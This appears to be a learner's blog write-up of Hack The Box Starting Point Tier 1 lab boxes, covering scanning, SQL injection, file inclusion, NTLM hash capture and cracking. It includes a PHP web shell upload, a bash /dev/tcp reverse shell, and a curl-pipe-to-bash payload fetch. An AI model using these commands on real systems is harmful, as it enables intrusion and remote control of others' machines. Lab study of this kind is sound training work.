---
title: 'HTB Starting Point - Tier 1'
description: 'Hack the Box Starting Point'
pubDate: 'Nov 26 2024'
heroImage: '/blog-placeholder-2.jpg'
---

Topics covered:  
* SQLi
* Server side template injection
* Remote file inclusion
* Web/reverse shells
* Navigating Jenkins
* S3

## Summary

Todo: summarise the boxes and the main techniques for exploiting them

Key learnings:
* Reconnaissance and enumeration. nmap everything. Use Wappalyzer on sites. gobuster for site enumeration
* MySQL basics
* FTP basics
* Name-based virtual hosting (incl. changes to /etc/hosts and vhost enumeration)
* LFI/RFI
* Responder
* Harvesting NTLM creds
* Simple reverse shell (incl. netcat, http server and bash script)


---

## Appointment  
*Apache, MariaDB, PHP, SQL, SQLi*

**Task 1**  
What does the acronym SQL stand for?  
Structured Query Language


**Task 2**  
What is one of the most common type of SQL vulnerabilities?  
SQL Injection


**Task 3**  
What is the 2021 OWASP Top 10 classification for this vulnerability?  
A03:2021-Injection 


**Task 4**  
What does Nmap report as the service and version that are running on port 80 of the target?

```bash
nmap -sV $TARGET

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```


**Task 5**  
What is the standard port used for the HTTPS protocol?  
443


**Task 6**  
What is a folder called in web-application terminology?  
Directory


**Task 7**  
What is the HTTP response code is given for 'Not Found' errors?  
404


**Task 8**  
Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?  

```bash
gobuster dir
```


**Task 9**  
What single character can be used to comment out the rest of a line in MySQL?  
`#`


**Task 10**  
If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?  
Login: `admin' #`

Webpage says "Congratulations! Your flag is: <flag>"


**Task 11**  
Submit root flag  
`e3d0796d002a446c0e622226f42e9672`

---

## Sequel
*MySQL, SQL, Weak credentials*

**Task 1**  
During our scan, which port do we find serving MySQL?  
```bash
kali$ nmap -sV $TARGET

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?

kali$ nmap -A $TARGET -p3006

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 96
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, SupportsLoadDataLocal, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, Support41Auth, Speaks41ProtocolOld, LongColumnFlag, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, InteractiveClient, SupportsCompression, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: Rz2(p{<V{-f>Ainn^j{M
|_  Auth Plugin Name: mysql_native_password
```


**Task 2**  
What community-developed MySQL version is the target running?  
MariaDB


**Task 3**  
When using the MySQL command line client, what switch do we need to use in order to specify a login username?  
`mysql -us <name>`


**Task 4**  
Which username allows us to log into this MariaDB instance without providing a password?  
`root`


**Task 5**  
In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?  
`*`


**Task 6**
In SQL, what symbol do we need to end each query with?  
`;`


**Task 7**
There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
```bash
kali$ mysql -u root -h $TARGET --skip-ssl

MariaDB> SHOW DATABASES
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.388 sec)
```

Answer: `htb`

This means that `information_schema`, `mysql` and `performance_schema` are found on every instance of MySQL

**Task 8**  
Submit root flag  

```sql
MariaDB> use htb

MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.305 sec)

MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | <flag>                           |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.336 sec)
```

---

## Crocodile
*Apache, FTP, Website Structure Discovery*

**Task 1**  
What Nmap scanning switch employs the use of default scripts during a scan?  
`-sC`


**Task 2**  
What service version is found to be running on port 21?  
```bash
$ nmap -sC $TARGET

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:$HOST_IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http
|_http-title: Smash - Bootstrap Business Template

Nmap done: 1 IP address (1 host up) scanned in 19.67 seconds
```

`vsFTPd 3.0.3`


**Task 3**  
What FTP code is returned to us for the "Anonymous FTP login allowed" message?  
`340` (see task 2)


**Task 4**  
After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?  
`anonymous`


**Task 5**  
After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?  
```bash
kali$ ftp anonymous@$TARGET

ftp> ls
ftp> get <file>
```

Answer: `get`


**Task 6**  
What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?  
`admin`


**Task 7**  
What version of Apache HTTP Server is running on the target host?  
```
nmap -sV --version-all -p80 $TARGET

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```


**Task 8**  
What switch can we use with Gobuster to specify we are looking for specific filetypes?  
`gobuster dir -x`


**Task 9**  
Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?  
```bash
kali$ gobuster dir -x php -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.68.207
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Documents/git/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.129.68.207/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 312] [--> http://10.129.68.207/css/]
/dashboard            (Status: 301) [Size: 318] [--> http://10.129.68.207/dashboard/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.68.207/fonts/]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 311] [--> http://10.129.68.207/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 278]
Progress: 8173 / 9472 (86.29%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 8173 / 9472 (86.29%)
===============================================================
Finished
===============================================================
```


**Task 10**  
Submit root flag  

From connecting to the ftp server earlier, we got the user list and their passwords:
```bash
kali$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin

kali$ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Logging in as admin takes you to the dashboard with the flag

---

## Responder 
*XAMPP, SMB, PHP, Remote File Inclusion, Remote Code Execution*

**Task 1**  
When visiting the web service using the IP address, what is the domain that we are being redirected to?  
`unika.htb`

*N.b. should have done a port scan as first action!*


**Task 2**  
Which scripting language is being used on the server to generate webpages?  
PHP. (Examine the index page redirecting to the domain)

> **Learning opportunity**
>
> I was unable to view any site content - the dns kept erroring out. If I had done an nmap scan at the start, I would have known that the web service was on port 80 (beyond simply assuming it was and seeing the server perform a redirect). 
>
> Looking at the official writeup, it went on to explain the server was using name-based virtual hosting. This is where multiple domains can be hosted on the same machine and each domain is able to handle their request separately. I've come across this concept before with services like `Coolify` though didn't know how it worked or what it was called. It allows one server to share the resources for multiple hostnames. The web server knows which service to hand the request to based on the domain name found in the `Host` HTTP header. 
>
> The fix for me is to manually add it to my `/etc/hosts` file


**Task 3**  
What is the name of the URL parameter which is used to load different language versions of the webpage?  
`page=german.html`


**Task 4**  
Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"  
`../../../../../../../../windows/system32/drivers/etc/hosts`

This exploit works on the unika.htb site. I assume this is working because php server is using the contents of `page=<file>` to populate the contents of the page. Thus by providing a different file, we see different content.

> **Learning Opportunity**
>
> Reading the HTB writeup, this exploit is possible due to the use of PHP's `include()` function combined with a lack of sanitisation. In this way, we can expose a file not intended to be displayed on the website.
>
> The `include()` function in PHP loads a specific file into memory and makes the contents available for use. e.g. IT can be used to read a file, or load php variables


**Task 5**  
Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"  
`//10.10.14.6/somefile`

> **Learning Opportunity**
>
> This format is called the Universal Naming Convention. It is useful for identifying servers and resources on a LAN. Windows uses backslashes, UNIX forward slashes. N.b. in DOS/Windows, this UNC doesn't include the drive, e.g. `c:\` or `d:\`. By default, Windows attempts to resolve UNC paths using the the SMB protocol. Other protocols that can resolve UNC paths includes WebDAV
>
> For this RFI to work, PHP must have `allow_url_include` enabled.

**Task 6**  
What does NTLM stand for?  
`New Technology LAN Manager`


**Task 7**  
Which flag do we use in the Responder utility to specify the network interface?  
`responder -I`

> **Learning Opportunity** 
>
> Responder is a tool that can gather hashed credentials used in NTLM and facilitate relay attacks. It targets the protocols Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS) and Multicast DNS (MDNS). 
>
> LLMNR is Windows component that acts as a host discovery method. You may particularly see this used in AD environments
>
> We can use Responder for either sniffing or spoofing. It can listen in on interactions to e.g. an SMB share. Alternatively, it can respond to host discovery queries by saying "yes, I am that server, send me your details". In this way, we can use Responder to gather credentials to be cracked later on 


**Task 8**  
There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?  
`John The Ripper`


**Task 9**  
What is the password for the administrator user?  

Potential approaches to this task:
* Local file inclusion to expose /etc/shadow file to identify admin user. (n.b. in retrospect, Windows doesn't have a shadow file! It stores NTLM hashes in SAM/AD)
* `responder` tool to capture NTLM hash and trigger a page load...?

I had to refer to the writeup as my knowledge was not there. See below (after the tasks) for notes of my learning.

```bash
john admin-hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2

badminton        (Administrator)
```


**Task 10**  
We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?  

```bash
nmap -sV $TARGET -p1-10000 --min-rate=5000

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port: `5985`


**Task 11**  
Submit root flag  

```bash
kali$ evil-winrm -i $TARGET -u Administrator -p badminton

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
responder\administrator
*Evil-WinRM* PS C:\Users\> cat mike/Desktop/flag.txt
<flag>
```

### Harvesting NTLM Credentials 
**Responder Challenge Capture - Utilising `Responder`, `SMB` and Remote File Inclusion**  

To summarise this challenge, we first exploit a PHP app that is unsafely using the `include()` function. We then attempt to utilise remote file inclusion to capture some NTLM credentials. We do this by triggering an SMB request back to our host machine. We capture the credentials by using `Responder` which is listening for SMB connections.

Resources:
* [Places of Interest in Stealing NetNTLM Hashes - Osanda Malith](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [Detailed Guide on Responder](https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/)

#### The NTLM Protocol 

NTLM is a set of challenge-response Microsoft authentication protocols to authenticate a client resource on an AD domain. The general flow is as follows:

1. Client -> Server: `domain\username`
2. Server -> Client: `challenge=random_string`
3. Client -> Server: `challenge_response=enc(user_ntlm_hash_1, random_string)`
    * N.b. If we're being specific, the `challenge_response` is encrypted by HMAC-MD5 using the NTLM hash as the key
4. Server: Retrieve user password or equivalent to generate the user's NTLM hash
5. Server: `enc(user_ntlm_hash_2, random_string) == challenge_response` 

Useful concepts to know:
* Hash: a one-way function. You know this
* NTHash: This is the hash stored in the SAM DB or on domain controllers. It is the output of the hash algorithm used in the NTLM protocol
* NetNTLMv2: This is a specific string format used in the flow described above. This format has a particular way of capturing the challenge and the response. While not technically a hash, you may hear this referred to as a NetNTLMv2 hash. The reason for this is because it can be attacked in a very similar way to a hash.


#### Responder 

##### LLMNR, MDNS Poisoning
Responder is a very capable tool. It is described as a LLMNR, NTB-NS and MDNS poisoner. These are all name resolution protocols. NTB-NS is the precursor to LLMNR. LLMNR and MDNS use multicast to resolve a hostname - it asks "who here is authoritatively known as the hostname in the query?". In MDNS, the device that responds informs all the other devices on the network too so that they may update their MDNS cache. 

The process of poisoning is when a malicious actor responds to the request saying "that's me (or I have access to that share)! Send me your creds and I'll authenticate you".

##### Poisoning through SMB

When a computer tries connecting with an SMB server for which the DNS server cannot resolve the hostname, the initiating device will send out an LLMNR query (multicast). If a share exists on the network, it can be accessed on the client machine by typing `\\<share-name>`. If it cannot be accessed, an error will be returned. Given this is a multicast, we can set up Responder to listen on the appropriate network interface to poison the multicast request. The client machine will see the challenge and prompt the user for credentials. However, even if the user doesn't enter their credentials, the hashes will be obtained!

##### Analyze Mode

By setting the `-A` flag, we can tell Responder not to poison any requests. Rather it will listen in and can be used to gather information like username, machine account, OS version, etc.


#### The Exploit

In this challenge, we are using Responder as a malicious SMB server. Conceptually, we are getting the vulnerable site to attempt connecting to the SMB server. Responder is used to send a challenge back the client so it may authenticate itself. Once it receives the response from the client, it stores the result. Given that the user's domain + username is public and the challenge is known, we can attack this in a similar way to a hash. The encryption has no freshness (i.e. IV). By trying many different passwords (to generate the user ntlm hash), we can see if the output of the encryption returns the same results (using John The Ripper).

N.b. The exploit used in this HTB challenge didn't utilise this poisoning (i.e. responding to name resolution requests). Since the RFI pointed directly to our fake SMB server, the exploitation was completed leveraging the application's trust in our SMB server

---

## Three
*Subdomain enumeration, S3 traversal, PHP, Bash, reverse shell*

**Task 1**  
How many TCP ports are open?  
2

```bash
$ nmap -sV $TARGET -p1-10000 --min-rate=5000

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```

**Task 2**
What is the domain of the email address provided in the "Contact" section of the website?  
`thetoppers.htb`


**Task 3**  
In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?  
`/etc/hosts`


**Task 4**  
Which sub-domain is discovered during further enumeration?  

Website enumeration can be done using gobuster. Will try its DNS enumeration mode (after adding `thetoppers.htb` to my `/etc/hosts` file):  
```bash
$ gobuster dns -d thetoppers.htb -w ~/Documents/git/SecLists/Discovery/DNS/shubs-subdomains.txt
```

The above didn't return any results. Returning to a concept explained in an earlier Starting Point box (and referring to the writeup), it is possible that this site is using name-based virtual hosting. In that case, we can use `gobuster vhost`

```bash
$ gobuster vhost --apend-domain -u thetoppers.htb -w ~/Documents/git/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

Found: s3.thetoppers.htb Status: 404 [Size: 21]
```

N.b. My internet dies very quickly when using gobuster, and I lose connectivity. 


**Task 5**  
Which service is running on the discovered sub-domain?  
Amazon S3


**Task 6**  
Which command line utility can be used to interact with the service running on the discovered sub-domain?  
`awscli`


**Task 7**  
Which command is used to set up the AWS CLI installation?  
`aws configure`


**Task 8**  
What is the command used by the above utility to list all of the S3 buckets?  
`aws s3 ls`


**Task 9**  
This server is configured to run files written in what web scripting language?    
`php`

> **Learning opportunity**
>
> There is a browser extension called Wappalyzer. It can be used to identify all the different components that a website is using, such as programming language(s), web servers, cdns, operating systems, etc.


**Task 10**  
Submit root flag  

Using the AWS CLI, we can explore the S3 buckets hosted here
```bash
$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2024-12-02 17:40:24 thetoppers.htb


$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2024-12-02 17:40:24          0 .htaccess
2024-12-02 17:40:24      11952 index.php

$ aws --endpoint=http://s3.thetoppers.htb s3 cp s3://thetoppers.htb/index.php ./index.php
download: s3://thetoppers.htb/index.php to ./index.php
```

Based on the above, it seems that `thetoppers.htb` is using the files in this S3 bucket for the site. If so, we might be able to upload a php shell to the bucket and have it execute on the server.

```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
$ curl http://thetoppers.htb/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Success! Next, let's try to obtain a reverse shell. First, we'll write up a simple reverse shell bash script:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<HOST_IP>/1337 0>&1
```

Some notes:
* `-i` makes bash interactive
* `>&` redirects stdout and stderr to the proceeding location
* `/dev/tcp/<ip>/<port>` is a special file to allow raw TCP connections
* `0>&1` redirects stdin to come from same location as stdout

The goal is for the target machine to execute this script. There are 2 more items required to perform the exploit: (1) set up a listener on our device, and (2) execute the script on the target. Regarding the first item, to receive the connection we must set up a listener on our device to receive the connection:

```bash
$ nc -nvlp 1337
```

Options:
* `-n` - Numeric only IP addresses, no DNS
* `-v` - Verbose
* `-l` - Listen for inbound connections
* `-p` - Specify the port

Now to execute the reverse shell script on the client, one way it can be done is to set up a local http server to serve the script. From the target, we can curl the file and pipe it into bash:

```bash
$ cd path/to/reverse/shell.sh
$ python3 -m http.server 8000 &
$ curl "http://thetoppers.htb/shell.php?cmd=curl <ip>:8000/shell.sh|bash
```

The request may hang, but you should see a connection made in netcat

```bash
$ nc -nvlp 1337
listening on [any] 1337 ...
$TARGET_IP - - [02/Dec/2024 19:28:15] "GET /shell.sh HTTP/1.1" 200 -
connect to [$HOST_IP] from (UNKNOWN) [$TARGET_IP] 36496
bash: cannot set terminal process group (1492): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ whoami
whoami
www-data
www-data@three:/var/www/html$ ls
ls
images
index.php
shell.php
www-data@three:/var/www/html$ cd ..
cd ..
www-data@three:/var/www$ ls
ls
flag.txt
html
www-data@three:/var/www$ cat flag.txt
cat flag.txt
<FLAG>
```

*TODO: Revise this exploit, to ensure I understand every step*

### Reverse Shell Utilising PHP and Bash 
**Obtain a reverse shell by arbitrary command execution in PHP**

Summary here

#### PHP File
Arbitrary command execution. Alternative options for PHP reverse shells. Seems like it can be done in PHP alone

#### Bash script


#### Exploit
http server, netcat, curl request